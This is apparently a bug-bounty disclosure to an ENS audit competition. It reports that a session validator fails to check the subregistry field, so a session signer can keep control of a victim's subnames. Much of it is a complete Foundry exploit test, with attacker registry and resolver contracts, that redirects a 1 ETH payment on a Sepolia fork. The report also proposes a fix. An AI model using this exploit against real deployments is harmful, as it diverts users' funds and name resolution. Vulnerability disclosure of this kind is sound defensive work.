# 93046 w a high unchecked registration subregistry lets an hca session signer retain control of victim owned subnames

**Submitted on Sep 14th 2026 at 03:45:22 UTC by @hyuunn for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93046
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/smart-account>
* **Impacts:**
  * Unauthorized takeover of a user's smart account (Hybrid Custody Account) or authenticated session, letting an attacker transfer the victim's names or funds or act as them, such as: - adding, replacing, or escalating an account owner or co-owner - extending or widening a session key's authority beyond its intended scope or lifetime - stealing an authenticated session or bearer token (Exploiting the 7-day session-key design as described in the Known Issues is not eligible; a weakness that grants authority beyond its stated lifetime or permissions is in scope.)

## Description

## Description

### Brief/Intro

A valid Standalone-HCA registration session signer can register a name to the intended owner and session-bound resolver while supplying an attacker-controlled `subregistry` that the on-chain session validator never checks. The registrar persists that registry pointer under the victim-owned parent, and the standard Universal Resolver follows it for child names, so the signer can redirect subname resolution after the owner revokes the session or the session expires; a Sepolia-fork reproduction redirected a 1 ETH payment made through the resolved address.

### Vulnerability Details

The application constructs normal commitments and reveal calls with a zero subregistry, but the Warp transport passes caller-provided calls through to the Rhinestone SDK with `verifyExecutions: true`. The security boundary is therefore the live `HCAOwnerAndSessionValidator`, not the client-side zero value.

In `contracts/src/hca/HCAOwnerAndSessionValidator.sol`, `_registrationResolver` validates only the registrant and resolver returned by `_registerFields`:

```solidity
(address registrant, address resolver) = _registerFields(execution.callData);
if (registrant != owner) {
    revert PolicyRuleFailed();
}
if (!seenRegister) {
    seenRegister = true;
    policyResolver = resolver;
} else if (policyResolver != resolver) {
    revert PolicyRuleFailed();
}
```

The helper skips the `subregistry` ABI word at offset `4 + 96`:

```solidity
function _registerFields(bytes memory callData)
    internal
    pure
    returns (address registrant, address resolver)
{
    registrant = _readAddress(callData, 4 + 32);
    resolver = _readAddress(callData, 4 + 128);
}
```

This omission is security-sensitive because `ETHRegistrar.register` includes `subregistry` in the commitment and passes it to the registry, while `PermissionedRegistry` stores it in the registered entry. `LibRegistry.findResolver` then follows that registry when resolving child labels. The validator consequently approves the exact malicious commitment and reveal even though direct session calls to `setSubregistry` are rejected.

The validator should read the `subregistry` word from every `register` call and require `address(0)` for a fixed registration session, or bind an exact owner-approved subregistry allowlist into the session permission. Regression coverage should preserve the zero-subregistry success case while rejecting a nonzero subregistry through `register`, in addition to the existing wrong-owner, wrong-resolver, direct-call, revocation, and expiry controls.

The attacker must control a currently valid registration session key that the victim owner legitimately enabled. The attacker does not need the owner key, a registry role, or administrator access.

1. The attacker deploys an `IRegistry` and resolver that return attacker-selected records for child labels.
2. Using the valid session, the attacker commits to a new parent registration containing the attacker registry.
3. After the registrar's normal minimum commitment age, the attacker signs a reveal that retains the legitimate victim owner and session-bound resolver but supplies the same attacker registry.
4. The live validator approves the batch because the owner and resolver match. The registrar consumes the commitment and stores the attacker registry pointer in the victim-owned parent entry.
5. The managed Universal Resolver follows the pointer for the test child `pay.injectparent.eth` and returns the attacker's resolver and address.
6. Revoking the session or waiting for expiry prevents new session operations but does not clear the stored pointer. The attacker can continue changing child resolution until the parent expires or its owner explicitly calls `setSubregistry` to repair it.

### Impact Details

This is a major authorization bypass over one newly registered parent namespace per successful exploit. The victim remains the parent owner, but the attacker controls resolution for the child namespace and can redirect users or integrations that trust standard ENS resolution. The fork PoC demonstrates a synthetic third-party client sending 1 ETH to the attacker-selected address. The amount at risk in production depends on external payments and is not bounded by these contracts; no current user loss was measured. Owner repair stops future malicious resolution, but it cannot reverse transfers already sent to an attacker-selected address. The valid-session prerequisite and owner repair path bound the issue below Critical, while persistent unauthorized namespace authority supports High severity.

**Impact:** Privilege escalation within the Standalone-HCA session mechanism that allows executing unapproved contract calls.

### References

* [HCA validator registration policy at the tested commit](https://github.com/ensdomains/contracts-v2/blob/8d9dcca8a7703e5d15958d628c39579d3aa789e1/contracts/src/hca/HCAOwnerAndSessionValidator.sol)
* [Registrar commitment and registration flow at the tested commit](https://github.com/ensdomains/contracts-v2/blob/8d9dcca8a7703e5d15958d628c39579d3aa789e1/contracts/src/registrar/ETHRegistrar.sol)
* [Persistent registry entry at the tested commit](https://github.com/ensdomains/contracts-v2/blob/8d9dcca8a7703e5d15958d628c39579d3aa789e1/contracts/src/registry/PermissionedRegistry.sol)
* [Universal Resolver registry traversal at the tested commit](https://github.com/ensdomains/contracts-v2/blob/8d9dcca8a7703e5d15958d628c39579d3aa789e1/contracts/src/universalResolver/libraries/LibRegistry.sol)
* [In-scope commitment builder](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/smart-account/src/providers/rhinestone/registration-calls.ts)
* [In-scope Warp transport](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/actors/warp-transport.actor.ts)

## Proof of Concept

## Proof of Concept

The test uses Foundry 1.7.1 and Solidity 0.8.27 against a local fork of Sepolia block `11,695,619`. It exercises the deployed validator at `0x5f249FCa8bB4949105651146858c347E8BFb0F7E`, registrar, registry, VerifiableFactory, resolver proxy, payment token, and managed Universal Resolver. The test creates only synthetic keys, labels, contracts, and fork-local balances; it does not modify public Sepolia state.

Save the following complete file as `contracts/test/unit/hca/SubregistryInjection.t.sol` in a checkout of `ensdomains/contracts-v2` at commit `8d9dcca8a7703e5d15958d628c39579d3aa789e1`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {IAddrResolver} from "@ens/contracts/resolvers/profiles/IAddrResolver.sol";
import {IERC7996} from "@ens/contracts/utils/IERC7996.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {IUniversalResolver} from "@ens/contracts/universalResolver/IUniversalResolver.sol";
import {IVerifiableFactory} from "@ensdomains/verifiable-factory/IVerifiableFactory.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {HCAOwnerAndSessionValidator} from "~src/hca/HCAOwnerAndSessionValidator.sol";
import {IETHRegistrar} from "~src/registrar/interfaces/IETHRegistrar.sol";
import {PermissionedRegistry} from "~src/registry/PermissionedRegistry.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {IStandardRegistry} from "~src/registry/interfaces/IStandardRegistry.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";
import {LibLabel} from "~src/utils/LibLabel.sol";

/// @notice Minimal HCA boundary that executes only a batch accepted by the deployed validator.
contract SubregistryInjectionControlledHCA {
    address public immutable owner;
    uint96 public sessionNonce;

    /// @param owner_ Owner reported to the deployed validator.
    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// @notice Returns the owner and revocation nonce used by fixed sessions.
    function ownerAndSessionNonce() external view returns (address owner_, uint96 sessionNonce_) {
        return (owner, sessionNonce);
    }

    /// @notice Invalidates all sessions enabled against the current nonce.
    function revokeSessions() external onlyOwner {
        ++sessionNonce;
    }

    /// @notice Executes one explicit owner-authorized setup or repair call.
    function ownerCall(address target, bytes calldata data)
        external
        onlyOwner
        returns (bytes memory result)
    {
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) assembly ("memory-safe") { revert(add(ret, 32), mload(ret)) }
        return ret;
    }

    /// @notice Enables a fixed session through the deployed validator.
    function enable(
        HCAOwnerAndSessionValidator validator,
        bytes32 permissionId,
        address sessionKey,
        uint48 validUntil,
        address resolver,
        address refundToken
    ) external onlyOwner {
        validator.enableSessionWithRefund(
            permissionId,
            sessionKey,
            validUntil,
            resolver,
            refundToken,
            20_000_000_000,
            500_000,
            100_000_000
        );
    }

    /// @notice Validates and executes the exact session-signed operation batch.
    function executeSession(
        HCAOwnerAndSessionValidator validator,
        bytes32 digest,
        bytes calldata envelope,
        bytes calldata operationData
    ) external {
        require(
            validator.isValidSignatureWithSender(
                validator.INTENT_EXECUTOR(), digest, envelope
            ) == 0x1626ba7e,
            "invalid session"
        );
        HCAOwnerAndSessionValidator.Execution[] memory executions =
            abi.decode(operationData[32:], (HCAOwnerAndSessionValidator.Execution[]));
        for (uint256 i; i < executions.length; ++i) {
            (bool ok, bytes memory ret) = executions[i].target.call{
                value: executions[i].value
            }(executions[i].callData);
            if (!ok) assembly ("memory-safe") { revert(add(ret, 32), mload(ret)) }
        }
    }
}

/// @notice Attacker-controlled child registry used by standard ENS registry traversal.
contract SubregistryInjectionAttackerRegistry is IRegistry {
    address public immutable attacker;
    IRegistry public immutable parent;
    string public parentLabel;
    address public selectedResolver;

    /// @param attacker_ Account allowed to change child resolution.
    /// @param parent_ Registry into which this registry will be injected.
    /// @param parentLabel_ Label under which this registry will be injected.
    constructor(address attacker_, IRegistry parent_, string memory parentLabel_) {
        attacker = attacker_;
        parent = parent_;
        parentLabel = parentLabel_;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "not attacker");
        _;
    }

    /// @notice Selects the resolver returned for child labels.
    function setSelectedResolver(address resolver) external onlyAttacker {
        selectedResolver = resolver;
    }

    /// @inheritdoc IRegistry
    function getSubregistry(string calldata) external pure returns (IRegistry) {
        return IRegistry(address(0));
    }

    /// @inheritdoc IRegistry
    function getResolver(string calldata) external view returns (address) {
        return selectedResolver;
    }

    /// @inheritdoc IRegistry
    function getParent() external view returns (IRegistry, string memory) {
        return (parent, parentLabel);
    }
}

/// @notice Immediate resolver whose address record remains controlled by the session actor.
contract SubregistryInjectionAttackerResolver {
    address public immutable attacker;
    mapping(bytes32 node => address value) internal _addresses;

    /// @param attacker_ Account allowed to change address records.
    constructor(address attacker_) {
        attacker = attacker_;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "not attacker");
        _;
    }

    /// @notice Sets one ETH address record.
    function setAddr(bytes32 node, address value) external onlyAttacker {
        _addresses[node] = value;
    }

    /// @notice Returns one ETH address record.
    function addr(bytes32 node) external view returns (address) {
        return _addresses[node];
    }

    /// @notice Reports immediate resolver and ENSIP-22 feature discovery interfaces.
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return
            interfaceId == 0x01ffc9a7 ||
            interfaceId == type(IERC7996).interfaceId ||
            interfaceId == type(IAddrResolver).interfaceId;
    }

    /// @notice Reports no optional feature requirement for direct single-profile calls.
    function supportsFeature(bytes4) external pure returns (bool) {
        return false;
    }
}

/// @notice Resolves through the deployed Universal Resolver and pays the returned address.
contract SubregistryInjectionUniversalResolverPaymentClient {
    /// @notice Resolves the ETH address for a DNS-encoded name.
    function resolve(IUniversalResolver universalResolver, bytes calldata name)
        public
        view
        returns (address resolved, address resolver)
    {
        bytes32 node = NameCoder.namehash(name, 0);
        (bytes memory result, address usedResolver) = universalResolver.resolve(
            name,
            abi.encodeCall(IAddrResolver.addr, (node))
        );
        return (abi.decode(result, (address)), usedResolver);
    }

    /// @notice Sends native value to the address returned by standard resolution.
    function pay(IUniversalResolver universalResolver, bytes calldata name) external payable {
        (address recipient,) = resolve(universalResolver, name);
        (bool ok,) = payable(recipient).call{value: msg.value}("");
        require(ok, "payment failed");
    }
}

contract SubregistryInjectionTest is Test {
    uint256 internal constant FORK_BLOCK = 11_695_619;
    string internal constant SEPOLIA_RPC = "https://ethereum-sepolia-rpc.publicnode.com";

    HCAOwnerAndSessionValidator internal constant VALIDATOR =
        HCAOwnerAndSessionValidator(0x5f249FCa8bB4949105651146858c347E8BFb0F7E);
    IVerifiableFactory internal constant FACTORY =
        IVerifiableFactory(0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef);
    IETHRegistrar internal constant REGISTRAR =
        IETHRegistrar(0xa88553F454b77203B0D036A05c894d555EAAa2Cc);
    IRegistry internal constant ETH_REGISTRY =
        IRegistry(0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2);
    IUniversalResolver internal constant UNIVERSAL_RESOLVER =
        IUniversalResolver(0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe);
    address internal constant RESOLVER_IMPL = 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e;
    address internal constant OWNABLE_SESSION_VALIDATOR =
        0x000000000013fdB5234E4E3162a810F54d9f7E98;
    bytes32 internal constant VALIDATOR_CODEHASH =
        0x3e7e34311353a7d3d9d6202735d3642b69ded6b49d1dfa4e8fef1efc14e1a364;

    bytes32 internal constant SINGLE_CHAIN_OPS_TYPEHASH =
        0xbae11135c33effc421d699bbb53d9926a005ed0f2f5eb672c62cbfa943807291;
    bytes32 internal constant OP_TYPEHASH =
        0xdbc520cb50a8aaf3fa06ea43dc3d59d248e52ae638476e3268a1e6e36bffe196;
    bytes32 internal constant EXECUTION_TYPEHASH =
        0x09b0a32e9842b65559835c235891737e06927d59e48a6f0e0512e136a513a9e4;
    bytes32 internal constant NO_GAS_REFUND_HASH =
        0x44db4de84d423abe696e354fc99de162153ee2f8985ab84305061247a78a3be4;

    uint256 internal ownerKey = uint256(keccak256("controlled owner"));
    uint256 internal sessionKey = uint256(keccak256("bounded session signer"));
    address internal owner;
    address internal sessionSigner;
    address internal redirectedAddress = address(0xA77AC);
    address internal secondRedirectedAddress = address(0xB0B);
    SubregistryInjectionControlledHCA internal hca;
    PermissionedResolver internal resolver;
    PermissionedResolver internal otherResolver;
    SubregistryInjectionAttackerRegistry internal attackerRegistry;
    SubregistryInjectionAttackerResolver internal attackerResolver;
    SubregistryInjectionUniversalResolverPaymentClient internal client;
    IERC20 internal paymentToken;
    bytes32 internal permissionId;
    uint48 internal validUntil;

    string internal constant CONTROL_LABEL = "controlzero";
    string internal constant PARENT_LABEL = "injectparent";
    string internal constant CHILD_LABEL = "pay";
    uint64 internal constant REGISTRATION_DURATION = uint64(365 days);
    bytes32 internal constant SECRET = bytes32(uint256(0x589));

    function setUp() public {
        vm.createSelectFork(SEPOLIA_RPC, FORK_BLOCK);
        assertEq(keccak256(address(VALIDATOR).code), VALIDATOR_CODEHASH);
        assertEq(VALIDATOR.PERMITTED_RESOLVER_IMPL(), RESOLVER_IMPL);
        assertEq(address(VALIDATOR.VERIFIABLE_FACTORY()), address(FACTORY));
        assertEq(address(VALIDATOR.ETH_REGISTRAR()), address(REGISTRAR));

        owner = vm.addr(ownerKey);
        sessionSigner = vm.addr(sessionKey);
        hca = new SubregistryInjectionControlledHCA(owner);
        client = new SubregistryInjectionUniversalResolverPaymentClient();
        paymentToken = IERC20(VALIDATOR.SECONDARY_PAYMENT_TOKEN());

        resolver = _deployResolver(_resolverSalt(address(hca), 0));
        otherResolver = _deployResolver(_resolverSalt(address(hca), 1));
        attackerRegistry = new SubregistryInjectionAttackerRegistry(
            sessionSigner,
            ETH_REGISTRY,
            PARENT_LABEL
        );
        attackerResolver = new SubregistryInjectionAttackerResolver(sessionSigner);
        vm.prank(sessionSigner);
        attackerRegistry.setSelectedResolver(address(attackerResolver));

        validUntil = uint48(block.timestamp + 1 days);
        permissionId = _destinationPermissionId(validUntil, address(resolver));
        vm.prank(owner);
        hca.enable(
            VALIDATOR,
            permissionId,
            sessionSigner,
            validUntil,
            address(resolver),
            address(paymentToken)
        );
        deal(address(paymentToken), address(hca), 1_000_000_000);
    }

    function test_endToEndSubregistryInjectionPersistsAfterRevocationAndExpiry() public {
        _sessionRegister(CONTROL_LABEL, IRegistry(address(0)), address(resolver), 1);
        assertEq(address(ETH_REGISTRY.getSubregistry(CONTROL_LABEL)), address(0));

        _sessionRegister(PARENT_LABEL, attackerRegistry, address(resolver), 10);
        assertEq(address(ETH_REGISTRY.getSubregistry(PARENT_LABEL)), address(attackerRegistry));
        assertEq(PermissionedRegistry(address(ETH_REGISTRY)).findOwner(PARENT_LABEL), owner);

        bytes memory name = NameCoder.encode(
            string.concat(CHILD_LABEL, ".", PARENT_LABEL, ".eth")
        );
        bytes32 childNode = NameCoder.namehash(name, 0);
        vm.prank(sessionSigner);
        attackerResolver.setAddr(childNode, redirectedAddress);

        (address resolved, address usedResolver) = client.resolve(UNIVERSAL_RESOLVER, name);
        assertEq(usedResolver, address(attackerResolver));
        assertEq(resolved, redirectedAddress);

        vm.deal(address(client), 1 ether);
        uint256 beforeBalance = redirectedAddress.balance;
        client.pay{value: 1 ether}(UNIVERSAL_RESOLVER, name);
        assertEq(redirectedAddress.balance - beforeBalance, 1 ether);

        vm.prank(owner);
        hca.revokeSessions();
        _expectRevokedSessionCannotChangeRegistry(30);
        assertEq(address(ETH_REGISTRY.getSubregistry(PARENT_LABEL)), address(attackerRegistry));

        vm.prank(sessionSigner);
        attackerResolver.setAddr(childNode, secondRedirectedAddress);
        (resolved, usedResolver) = client.resolve(UNIVERSAL_RESOLVER, name);
        assertEq(usedResolver, address(attackerResolver));
        assertEq(resolved, secondRedirectedAddress);

        vm.warp(uint256(validUntil) + 1);
        assertEq(address(ETH_REGISTRY.getSubregistry(PARENT_LABEL)), address(attackerRegistry));
        (resolved, usedResolver) = client.resolve(UNIVERSAL_RESOLVER, name);
        assertEq(usedResolver, address(attackerResolver));
        assertEq(resolved, secondRedirectedAddress);

        vm.prank(owner);
        PermissionedRegistry(address(ETH_REGISTRY)).setSubregistry(
            LibLabel.id(PARENT_LABEL),
            IRegistry(address(0))
        );
        assertEq(address(ETH_REGISTRY.getSubregistry(PARENT_LABEL)), address(0));
        (usedResolver,,) = UNIVERSAL_RESOLVER.findResolver(name);
        assertTrue(usedResolver != address(attackerResolver));

        emit log_named_address("injectedSubregistry", address(attackerRegistry));
        emit log_named_address("attackerResolver", address(attackerResolver));
        emit log_named_address("postRevocationResolvedAddress", secondRedirectedAddress);
        emit log_named_uint("redirectedWei", redirectedAddress.balance - beforeBalance);
    }

    function test_negativeControlsRejectWrongOwnerResolverAndDirectSetSubregistry() public {
        HCAOwnerAndSessionValidator.Execution[] memory executions =
            _revealExecutions(
                "wrongowner",
                makeAddr("other-owner"),
                attackerRegistry,
                address(resolver)
            );
        _expectPolicyFailure(executions, 40);

        executions = _revealExecutions(
            "wrongresolver",
            owner,
            attackerRegistry,
            address(otherResolver)
        );
        _expectPolicyFailure(executions, 41);

        executions = new HCAOwnerAndSessionValidator.Execution[](1);
        executions[0] = HCAOwnerAndSessionValidator.Execution({
            target: address(ETH_REGISTRY),
            value: 0,
            callData: abi.encodeCall(
                IStandardRegistry.setSubregistry,
                (LibLabel.id(PARENT_LABEL), attackerRegistry)
            )
        });
        (bytes32 digest, bytes memory envelope, bytes memory operationData) =
            _buildExecution(executions, 42);
        vm.expectPartialRevert(HCAOwnerAndSessionValidator.ActionNotAllowed.selector);
        vm.prank(sessionSigner);
        hca.executeSession(VALIDATOR, digest, envelope, operationData);
    }

    function _sessionRegister(
        string memory label,
        IRegistry subregistry,
        address registrationResolver,
        uint256 nonceBase
    ) internal {
        bytes32 commitment = REGISTRAR.makeCommitment(
            label,
            owner,
            SECRET,
            subregistry,
            registrationResolver,
            REGISTRATION_DURATION,
            bytes32(0)
        );
        HCAOwnerAndSessionValidator.Execution[] memory executions =
            new HCAOwnerAndSessionValidator.Execution[](1);
        executions[0] = HCAOwnerAndSessionValidator.Execution({
            target: address(REGISTRAR),
            value: 0,
            callData: abi.encodeCall(IETHRegistrar.commit, (commitment))
        });
        _executeSession(executions, nonceBase);

        uint64 minAge = uint64(_readUint(address(REGISTRAR), "MIN_COMMITMENT_AGE()"));
        vm.warp(block.timestamp + minAge + 1);
        _executeSession(
            _revealExecutions(label, owner, subregistry, registrationResolver),
            nonceBase + 1
        );
    }

    function _revealExecutions(
        string memory label,
        address registrant,
        IRegistry subregistry,
        address registrationResolver
    )
        internal
        view
        returns (HCAOwnerAndSessionValidator.Execution[] memory executions)
    {
        (uint256 base, uint256 premium) =
            REGISTRAR.getRegisterPrice(label, REGISTRATION_DURATION, paymentToken);
        executions = new HCAOwnerAndSessionValidator.Execution[](3);
        executions[0] = HCAOwnerAndSessionValidator.Execution({
            target: address(paymentToken),
            value: 0,
            callData: abi.encodeCall(IERC20.approve, (address(REGISTRAR), base + premium))
        });
        executions[1] = HCAOwnerAndSessionValidator.Execution({
            target: address(REGISTRAR),
            value: 0,
            callData: abi.encodeCall(
                IETHRegistrar.register,
                (
                    label,
                    registrant,
                    SECRET,
                    subregistry,
                    registrationResolver,
                    REGISTRATION_DURATION,
                    paymentToken,
                    bytes32(0)
                )
            )
        });
        executions[2] = HCAOwnerAndSessionValidator.Execution({
            target: registrationResolver,
            value: 0,
            callData: abi.encodeCall(
                PermissionedResolver.authorizeNameRoles,
                (hex"00", EACBaseRolesLib.ALL_ROLES, owner, true)
            )
        });
    }

    function _expectRevokedSessionCannotChangeRegistry(uint256 nonce) internal {
        HCAOwnerAndSessionValidator.Execution[] memory executions =
            new HCAOwnerAndSessionValidator.Execution[](1);
        executions[0] = HCAOwnerAndSessionValidator.Execution({
            target: address(ETH_REGISTRY),
            value: 0,
            callData: abi.encodeCall(
                IStandardRegistry.setSubregistry,
                (LibLabel.id(PARENT_LABEL), IRegistry(address(0)))
            )
        });
        (bytes32 digest, bytes memory envelope, bytes memory operationData) =
            _buildExecution(executions, nonce);
        vm.expectRevert(HCAOwnerAndSessionValidator.InvalidSigner.selector);
        vm.prank(sessionSigner);
        hca.executeSession(VALIDATOR, digest, envelope, operationData);
    }

    function _expectPolicyFailure(
        HCAOwnerAndSessionValidator.Execution[] memory executions,
        uint256 nonce
    ) internal {
        (bytes32 digest, bytes memory envelope, bytes memory operationData) =
            _buildExecution(executions, nonce);
        vm.expectRevert(HCAOwnerAndSessionValidator.PolicyRuleFailed.selector);
        vm.prank(sessionSigner);
        hca.executeSession(VALIDATOR, digest, envelope, operationData);
    }

    function _executeSession(
        HCAOwnerAndSessionValidator.Execution[] memory executions,
        uint256 nonce
    ) internal {
        (bytes32 digest, bytes memory envelope, bytes memory operationData) =
            _buildExecution(executions, nonce);
        vm.prank(sessionSigner);
        hca.executeSession(VALIDATOR, digest, envelope, operationData);
    }

    function _buildExecution(
        HCAOwnerAndSessionValidator.Execution[] memory executions,
        uint256 nonce
    )
        internal
        returns (bytes32 digest, bytes memory envelope, bytes memory operationData)
    {
        bytes32 mode = VALIDATOR.ERC7579_ERC1271_MODE();
        operationData = abi.encodePacked(mode, abi.encode(executions));
        digest = _singleChainDigest(nonce, mode, executions);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sessionKey, digest);
        envelope = abi.encodePacked(
            bytes1(uint8(1)), permissionId, nonce, operationData, r, s, v
        );
    }

    function _singleChainDigest(
        uint256 nonce,
        bytes32 mode,
        HCAOwnerAndSessionValidator.Execution[] memory executions
    ) internal view returns (bytes32) {
        bytes32[] memory hashes = new bytes32[](executions.length);
        for (uint256 i; i < executions.length; ++i) {
            hashes[i] = keccak256(
                abi.encode(
                    EXECUTION_TYPEHASH,
                    executions[i].target,
                    executions[i].value,
                    keccak256(executions[i].callData)
                )
            );
        }
        bytes32 operationHash =
            keccak256(abi.encode(OP_TYPEHASH, mode, keccak256(abi.encodePacked(hashes))));
        bytes32 structHash = keccak256(
            abi.encode(
                SINGLE_CHAIN_OPS_TYPEHASH,
                address(hca),
                nonce,
                operationHash,
                NO_GAS_REFUND_HASH
            )
        );
        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256(
                    "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
                ),
                keccak256("IntentExecutor"),
                keccak256("v0.0.1"),
                block.chainid,
                VALIDATOR.INTENT_EXECUTOR()
            )
        );
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }

    function _deployResolver(uint256 salt) internal returns (PermissionedResolver deployed) {
        bytes[] memory setters = new bytes[](0);
        bytes memory result = _ownerCall(
            address(FACTORY),
            abi.encodeCall(
                IVerifiableFactory.deployProxy,
                (
                    RESOLVER_IMPL,
                    salt,
                    abi.encodeCall(
                        PermissionedResolver.initialize,
                        (address(hca), EACBaseRolesLib.ALL_ROLES, setters)
                    )
                )
            )
        );
        deployed = PermissionedResolver(abi.decode(result, (address)));
        assertEq(FACTORY.verifyContract(address(deployed)), RESOLVER_IMPL);
    }

    function _destinationPermissionId(uint48 expiry, address resolver_)
        internal
        view
        returns (bytes32)
    {
        bytes32 salt = keccak256(
            abi.encode(
                uint96(0),
                expiry,
                resolver_,
                address(paymentToken),
                uint96(20_000_000_000),
                uint48(500_000),
                uint96(100_000_000)
            )
        );
        address[] memory owners = new address[](1);
        owners[0] = sessionSigner;
        return keccak256(abi.encode(OWNABLE_SESSION_VALIDATOR, abi.encode(uint256(1), owners), salt));
    }

    function _resolverSalt(address account, uint256 version) internal pure returns (uint256) {
        return uint256(
            keccak256(
                abi.encode(keccak256(bytes("OwnedResolver")), account, version)
            )
        );
    }

    function _ownerCall(address target, bytes memory data) internal returns (bytes memory) {
        vm.prank(owner);
        return hca.ownerCall(target, data);
    }

    function _readUint(address target, string memory signature)
        internal
        view
        returns (uint256 value)
    {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature(signature));
        require(ok, "read failed");
        value = abi.decode(data, (uint256));
    }
}
```

Install dependencies and run the test:

```sh
git clone https://github.com/ensdomains/contracts-v2.git contracts-v2
git -C contracts-v2 fetch origin refs/pull/409/head:refs/remotes/pr/409
git -C contracts-v2 checkout --detach 8d9dcca8a7703e5d15958d628c39579d3aa789e1
git -C contracts-v2 submodule update --init --recursive
cd contracts-v2/contracts
forge test --match-path test/unit/hca/SubregistryInjection.t.sol -vvv
```

The positive test first registers a zero-subregistry control, then injects the attacker registry through the real commit/reveal path. It asserts that the victim remains owner, the managed Universal Resolver returns the attacker-controlled record, a 1 ETH payment reaches that record, and the pointer persists after both revocation and expiry. The negative test confirms that a wrong owner, a wrong session resolver, and a direct `setSubregistry` call are rejected; the positive test also confirms a revoked session is rejected.

Observed output:

```
Ran 2 tests for test/unit/hca/SubregistryInjection.t.sol:SubregistryInjectionTest
[PASS] test_endToEndSubregistryInjectionPersistsAfterRevocationAndExpiry()
Logs:
  injectedSubregistry: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
  attackerResolver: 0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
  postRevocationResolvedAddress: 0x0000000000000000000000000000000000000B0b
  redirectedWei: 1000000000000000000

[PASS] test_negativeControlsRejectWrongOwnerResolverAndDirectSetSubregistry()
Suite result: ok. 2 passed; 0 failed; 0 skipped
```
